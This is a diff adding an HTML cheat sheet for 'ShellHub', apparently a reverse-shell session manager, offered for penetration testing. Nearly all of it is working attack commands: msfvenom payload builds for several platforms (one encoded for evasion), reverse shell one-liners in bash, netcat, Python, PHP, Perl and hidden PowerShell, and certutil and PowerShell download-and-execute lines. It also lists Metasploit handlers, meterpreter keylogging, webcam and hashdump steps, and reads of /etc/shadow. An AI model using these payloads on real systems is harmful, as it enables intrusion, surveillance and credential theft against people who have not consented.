@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Cheat Sheet — ShellHub</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
+h1 { color: #00ff00; font-size: 28px; margin-bottom: 4px; }
+.sub { color: #8b949e; margin-bottom: 24px; font-size: 14px; }
+.category { margin-bottom: 32px; }
+.category h2 { color: #58a6ff; font-size: 18px; border-bottom: 1px solid #21262d; padding-bottom: 8px; margin-bottom: 12px; }
+table { width: 100%; border-collapse: collapse; font-size: 13px; }
+th { text-align: left; padding: 8px 12px; background: #161b22; color: #8b949e; font-weight: 600; border: 1px solid #21262d; }
+td { padding: 8px 12px; border: 1px solid #21262d; vertical-align: top; }
+tr:nth-child(even) td { background: #0d1117; }
+tr:nth-child(odd) td { background: #161b22; }
+code { background: #1f2937; padding: 1px 6px; border-radius: 3px; font-size: 12px; color: #ffa657; }
+.cmd { color: #7ee787; }
+.comment { color: #8b949e; font-style: italic; font-size: 12px; }
+</style>
+</head>
+<body>
+
+<h1>Cheat Sheet</h1>
+<p class="sub">Penetration Testing &bull; Linux &bull; CS 1.6 &bull; ShellHub</p>
+
+<div class="category">
+<h2>ShellHub — Session Manager</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">python shellhub.py</code></td><td>Start ShellHub (listeners: TCP 4444 &bull; Web UI :8080)</td></tr>
+<tr><td><code class="cmd">http://localhost:8080</code></td><td>Open web dashboard in browser</td></tr>
+<tr><td><code class="cmd">nc localhost 4444</code></td><td>Test connection — spawns a session in the UI</td></tr>
+<tr><td><code class="cmd">nc -lvnp 4444</code></td><td>Traditional listener (alternative to ShellHub)</td></tr>
+<tr><td class="comment" colspan="2">Click a session in the sidebar to interact. History is saved to SQLite automatically.</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Reverse Shell Payloads — MSFVenom</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe</code></td><td>Windows staged reverse TCP (meterpreter)</td></tr>
+<tr><td><code class="cmd">msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe</code></td><td>Windows plain reverse TCP shell</td></tr>
+<tr><td><code class="cmd">msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf</code></td><td>Linux reverse shell ELF</td></tr>
+<tr><td><code class="cmd">msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho -o shell.macho</code></td><td>macOS reverse shell</td></tr>
+<tr><td><code class="cmd">msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o shell.apk</code></td><td>Android reverse shell APK</td></tr>
+<tr><td><code class="cmd">msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.php</code></td><td>PHP reverse shell</td></tr>
+<tr><td><code class="cmd">msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.py</code></td><td>Python reverse shell</td></tr>
+<tr><td><code class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe</code></td><td>Encoded payload (shikata_ga_nai × 5)</td></tr>
+<tr><td><code class="cmd">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe</code></td><td>Windows x64 reverse TCP</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Reverse Shell — Manual One-Liners</h2>
+<table>
+<tr><th>Command</th><th>Platform</th></tr>
+<tr><td><code class="cmd">bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code></td><td>Linux — bash</td></tr>
+<tr><td><code class="cmd">nc -e /bin/sh IP PORT</code></td><td>Linux — netcat</td></tr>
+<tr><td><code class="cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP PORT &gt;/tmp/f</code></td><td>Linux — mkfifo (no -e)</td></tr>
+<tr><td><code class="cmd">python -c 'import socket,subprocess;s=socket.socket();s.connect(("IP",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'</code></td><td>Linux — Python</td></tr>
+<tr><td><code class="cmd">php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"IP",PORT);shell_exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></td><td>Linux — PHP</td></tr>
+<tr><td><code class="cmd">perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'</code></td><td>Linux — Perl</td></tr>
+<tr><td><code class="cmd">powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object System.Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"</code></td><td>Windows — PowerShell</td></tr>
+<tr><td><code class="cmd">certutil -urlcache -f http://IP/payload.exe payload.exe && payload.exe</code></td><td>Windows — download + exec</td></tr>
+<tr><td><code class="cmd">powershell -c "Invoke-WebRequest -Uri http://IP/payload.exe -OutFile payload.exe; ./payload.exe"</code></td><td>Windows — PowerShell download</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Listener Setup</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">nc -lvnp PORT</code></td><td>Netcat listener (plain shell)</td></tr>
+<tr><td><code class="cmd">msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT PORT; run"</code></td><td>Metasploit multi/handler (non-interactive)</td></tr>
+<tr><td><code class="cmd">msfconsole</code><br>&nbsp;&nbsp;use multi/handler<br>&nbsp;&nbsp;set payload windows/meterpreter/reverse_tcp<br>&nbsp;&nbsp;set LHOST 0.0.0.0<br>&nbsp;&nbsp;set LPORT PORT<br>&nbsp;&nbsp;run</td><td>Metasploit multi/handler (interactive)</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Meterpreter — Post-Exploitation</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">sysinfo</code></td><td>Show target system info</td></tr>
+<tr><td><code class="cmd">getuid</code></td><td>Show current user</td></tr>
+<tr><td><code class="cmd">getsystem</code></td><td>Privilege escalation attempt</td></tr>
+<tr><td><code class="cmd">shell</code></td><td>Drop to system shell</td></tr>
+<tr><td><code class="cmd">upload /path/file</code></td><td>Upload file to target</td></tr>
+<tr><td><code class="cmd">download /path/file</code></td><td>Download file from target</td></tr>
+<tr><td><code class="cmd">ps</code></td><td>List running processes</td></tr>
+<tr><td><code class="cmd">migrate PID</code></td><td>Migrate to another process</td></tr>
+<tr><td><code class="cmd">keyscan_start / keyscan_dump</code></td><td>Capture keystrokes</td></tr>
+<tr><td><code class="cmd">screenshot</code></td><td>Take a screenshot</td></tr>
+<tr><td><code class="cmd">webcam_snap</code></td><td>Take webcam photo</td></tr>
+<tr><td><code class="cmd">hashdump</code></td><td>Dump SAM hashes (Windows)</td></tr>
+<tr><td><code class="cmd">run post/windows/gather/enum_logged_on_users</code></td><td>Enumerate logged-in users</td></tr>
+<tr><td><code class="cmd">run post/multi/recon/local_exploit_suggester</code></td><td>Suggest local exploits</td></tr>
+<tr><td><code class="cmd">background</code></td><td>Background current session</td></tr>
+<tr><td><code class="cmd">sessions -i ID</code></td><td>Interact with session</td></tr>
+<tr><td><code class="cmd">sessions -u ID</code></td><td>Upgrade shell to meterpreter</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Linux — Essential Commands</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">whoami</code></td><td>Current user</td></tr>
+<tr><td><code class="cmd">id</code></td><td>User & group info</td></tr>
+<tr><td><code class="cmd">uname -a</code></td><td>Full system info (kernel, arch, hostname)</td></tr>
+<tr><td><code class="cmd">cat /etc/os-release</code></td><td>OS version info</td></tr>
+<tr><td><code class="cmd">ls -la</code></td><td>List files with details</td></tr>
+<tr><td><code class="cmd">pwd</code></td><td>Print working directory</td></tr>
+<tr><td><code class="cmd">ps aux</code></td><td>All running processes</td></tr>
+<tr><td><code class="cmd">netstat -tulpn</code></td><td>Listening ports</td></tr>
+<tr><td><code class="cmd">ss -tulpn</code></td><td>Listening ports (modern)</td></tr>
+<tr><td><code class="cmd">ifconfig</code></td><td>Network interfaces</td></tr>
+<tr><td><code class="cmd">ip a</code></td><td>Network interfaces (modern)</td></tr>
+<tr><td><code class="cmd">curl ifconfig.me</code></td><td>Public IP</td></tr>
+<tr><td><code class="cmd">find / -type f -name "*.txt" 2>/dev/null</code></td><td>Find files by name</td></tr>
+<tr><td><code class="cmd">grep -r "pattern" /path</code></td><td>Recursive search in files</td></tr>
+<tr><td><code class="cmd">chmod +x file</code></td><td>Make file executable</td></tr>
+<tr><td><code class="cmd">chown user:group file</code></td><td>Change file owner</td></tr>
+<tr><td><code class="cmd">sudo -l</code></td><td>List sudo privileges</td></tr>
+<tr><td><code class="cmd">history</code></td><td>Command history</td></tr>
+<tr><td><code class="cmd">kill -9 PID</code></td><td>Force kill process</td></tr>
+<tr><td><code class="cmd">systemctl start/stop/status SERVICE</code></td><td>Systemd service control</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Linux — Privilege Escalation Enumeration</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">sudo -l</code></td><td>Check sudo permissions</td></tr>
+<tr><td><code class="cmd">find / -perm -4000 2>/dev/null</code></td><td>SUID binaries</td></tr>
+<tr><td><code class="cmd">find / -perm -2000 2>/dev/null</code></td><td>SGID binaries</td></tr>
+<tr><td><code class="cmd">cat /etc/crontab</code></td><td>Scheduled cron jobs</td></tr>
+<tr><td><code class="cmd">ls -la /etc/cron*</code></td><td>Cron directories</td></tr>
+<tr><td><code class="cmd">cat /etc/passwd | grep -E "/bin/.*sh"</code></td><td>Users with shell access</td></tr>
+<tr><td><code class="cmd">cat /etc/shadow 2>/dev/null</code></td><td>Password hashes (if readable)</td></tr>
+<tr><td><code class="cmd">w</code></td><td>Who is logged in</td></tr>
+<tr><td><code class="cmd">uname -r</code></td><td>Kernel version (check for exploits)</td></tr>
+<tr><td><code class="cmd">lsblk</code></td><td>Block devices / mounted disks</td></tr>
+<tr><td><code class="cmd">mount</code></td><td>Mounted filesystems</td></tr>
+<tr><td><code class="cmd">cat /etc/exports</code></td><td>NFS exports (check no_root_squash)</td></tr>
+<tr><td><code class="cmd">which nc python python3 perl gcc wget curl</code></td><td>Available tools</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Windows — Post-Exploitation (CMD)</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">whoami</code></td><td>Current user</td></tr>
+<tr><td><code class="cmd">whoami /priv</code></td><td>List privileges</td></tr>
+<tr><td><code class="cmd">net user</code></td><td>List local users</td></tr>
+<tr><td><code class="cmd">net localgroup administrators</code></td><td>List admin group</td></tr>
+<tr><td><code class="cmd">systeminfo</code></td><td>System information</td></tr>
+<tr><td><code class="cmd">ipconfig /all</code></td><td>Network configuration</td></tr>
+<tr><td><code class="cmd">netstat -an</code></td><td>Active connections</td></tr>
+<tr><td><code class="cmd">tasklist</code></td><td>Running processes</td></tr>
+<tr><td><code class="cmd">wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Installed patches</td></tr>
+<tr><td><code class="cmd">wmic product get name,version</code></td><td>Installed software</td></tr>
+<tr><td><code class="cmd">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></td><td>Startup programs</td></tr>
+<tr><td><code class="cmd">schtasks /query /fo LIST /v</code></td><td>Scheduled tasks</td></tr>
+</table>
+</div>
+
+
+<div class="category">
+<h2>Network Scanning — Nmap</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">nmap -sV TARGET</code></td><td>Service version detection</td></tr>
+<tr><td><code class="cmd">nmap -sC TARGET</code></td><td>Default scripts scan</td></tr>
+<tr><td><code class="cmd">nmap -sS TARGET</code></td><td>SYN stealth scan</td></tr>
+<tr><td><code class="cmd">nmap -p- TARGET</code></td><td>Scan all 65535 ports</td></tr>
+<tr><td><code class="cmd">nmap -A TARGET</code></td><td>Aggressive (OS + services + scripts + traceroute)</td></tr>
+<tr><td><code class="cmd">nmap -sn 192.168.1.0/24</code></td><td>Ping sweep (find live hosts)</td></tr>
+<tr><td><code class="cmd">nmap --script vuln TARGET</code></td><td>Vulnerability scan</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Web Enumeration</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt</code></td><td>Directory brute-force</td></tr>
+<tr><td><code class="cmd">gobuster dns -d TARGET.com -w /usr/share/wordlists/dns/subdomains.txt</code></td><td>Subdomain enumeration</td></tr>
+<tr><td><code class="cmd">curl -i http://TARGET</code></td><td>View HTTP headers + body</td></tr>
+<tr><td><code class="cmd">curl -X POST -d "param=value" http://TARGET</code></td><td>POST request</td></tr>
+<tr><td><code class="cmd">wget http://TARGET/file</code></td><td>Download file</td></tr>
+<tr><td><code class="cmd">whatweb http://TARGET</code></td><td>Web technology fingerprinting</td></tr>
+<tr><td><code class="cmd">nikto -h http://TARGET</code></td><td>Web server scanner</td></tr>
+</table>
+</div>
+
+<div class="category">
+<h2>Python — Quick HTTP Server</h2>
+<table>
+<tr><th>Command</th><th>Description</th></tr>
+<tr><td><code class="cmd">python3 -m http.server 8000</code></td><td>Serve current directory on port 8000</td></tr>
+<tr><td><code class="cmd">python3 -m http.server 8000 --bind 0.0.0.0</code></td><td>Serve on all interfaces</td></tr>
+<tr><td><code class="cmd">python3 -m uploadserver 8000</code></td><td>HTTP server with file upload (pip install uploadserver)</td></tr>
+</table>
+</div>
+
+<p class="sub" style="margin-top:32px;">Generated by ShellHub &mdash; Use responsibly. Unauthorized access is illegal.</p>
+
+</body>
+</html>
